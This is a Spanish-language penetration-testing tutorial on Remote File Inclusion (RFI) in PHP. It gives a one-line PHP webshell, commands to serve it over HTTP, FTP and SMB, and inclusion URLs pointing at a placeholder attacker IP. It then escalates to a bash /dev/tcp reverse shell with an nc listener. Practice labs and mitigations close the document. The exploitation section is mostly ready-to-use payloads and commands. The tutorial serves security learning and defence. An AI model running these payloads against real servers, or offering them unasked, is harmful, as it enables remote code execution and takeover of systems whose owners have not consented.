# Remote File Inclusion (RFI)

RFI es una variante de LFI en la que la aplicación no solo incluye archivos locales, sino también **archivos remotos** servidos desde una URL externa. Permite ejecutar código malicioso alojado en el servidor del atacante directamente en el servidor víctima.

> **Relación con LFI:** Casi toda vulnerabilidad RFI es también LFI, pero no al revés. Para que exista RFI en PHP es necesario que `allow_url_include = On` esté activo en `php.ini`, lo cual está deshabilitado por defecto en instalaciones modernas.

---

## Verificar si LFI escala a RFI

Antes de lanzar un ataque RFI, confirmar que la inclusión de URLs remotas está permitida intentando incluir la propia aplicación:

```
http://target.com/index.php?page=http://127.0.0.1/index.php
```

Si la página se renderiza dentro de sí misma, el servidor acepta URLs remotas y la vulnerabilidad es RFI.

También se puede verificar via LFI leyendo `php.ini`:
```bash
# Buscar allow_url_include en la configuración decodificada
echo 'W1BIUF0K...' | base64 -d | grep allow_url_include
```

---

## Explotación

### Paso 1: Crear el payload

```php
<?php system($_GET['cmd']); ?>
```

Guardar como `shell.php`.

### Paso 2: Servir el payload

**HTTP (Python):**
```bash
sudo python3 -m http.server 80
```

**FTP (pyftpdlib):**
```bash
sudo python3 -m pyftpdlib -p 21
```

**SMB (Impacket — para Windows):**
```bash
impacket-smbserver -smb2support share $(pwd)
```

### Paso 3: Incluir el archivo remoto

**Via HTTP:**
```
http://target.com/index.php?page=http://<IP_ATACANTE>/shell.php&cmd=id
```

**Via FTP:**
```
http://target.com/index.php?page=ftp://<IP_ATACANTE>/shell.php&cmd=id
```

**Via SMB (Windows, no requiere `allow_url_include`):**
```
http://target.com/index.php?page=\\<IP_ATACANTE>\share\shell.php&cmd=whoami
```

> SMB es especialmente útil en Windows porque el sistema operativo trata los archivos en recursos compartidos remotos como archivos locales, sin necesitar configuración especial en PHP.

---

## De webshell a reverse shell completa

Una vez se puede ejecutar comandos via RFI, obtener una reverse shell interactiva:

**Listener en el atacante:**
```bash
nc -nlvp 443
```

**Payload via URL (encodear el `&` como `%26`):**
```
?page=http://<IP_ATACANTE>/shell.php&cmd=bash -c "bash -i >%26 /dev/tcp/<IP_ATACANTE>/443 0>%261"
```

---

## Diferencias clave RFI vs LFI

| Aspecto | LFI | RFI |
|---|---|---|
| Origen del archivo | Sistema local del servidor | URL remota (HTTP, FTP, SMB) |
| Requisito PHP | Solo LFI habilitado | `allow_url_include = On` |
| Riesgo | Alto (lectura de archivos sensibles) | Crítico (RCE directa) |
| Frecuencia | Muy común | Menos común (configuración necesaria) |

---

## Laboratorios para practicar

- **DVWP** (WordPress vulnerable): [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)
  - Plugin necesario: **Gwolle Guestbook v1.5.3** — [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)

---

## Mitigaciones

- Mantener `allow_url_include = Off` (valor por defecto en PHP moderno)
- Mantener `allow_url_fopen = Off` cuando no sea necesario
- No construir rutas de archivo a partir de input del usuario
- WAF con reglas para detectar esquemas de URL en parámetros (`http://`, `ftp://`, `\\`)
